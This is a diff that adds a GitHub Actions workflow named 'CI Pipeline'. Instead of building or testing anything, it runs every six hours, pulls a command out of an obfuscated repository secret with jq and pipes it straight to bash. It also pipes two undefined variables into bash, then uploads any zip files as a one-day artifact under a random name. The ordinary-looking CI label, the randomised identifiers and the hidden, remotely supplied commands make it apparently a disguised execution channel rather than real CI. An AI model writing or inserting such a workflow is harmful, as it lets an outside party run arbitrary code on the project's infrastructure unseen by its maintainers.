@@ -1,0 +1,33 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '22 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          htj986: ${{ secrets.htj986 }}
+        run: |
+          printf '%s' "$htj986" | jq -r .ou40494 | /bin/bash
+          echo $uh059 | jq -r .fxdrx2933 | /bin/bash
+          echo $yxtir20 | jq -r .bir778 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2l0w4590
+          path: "*.zip"
+          retention-days: 1
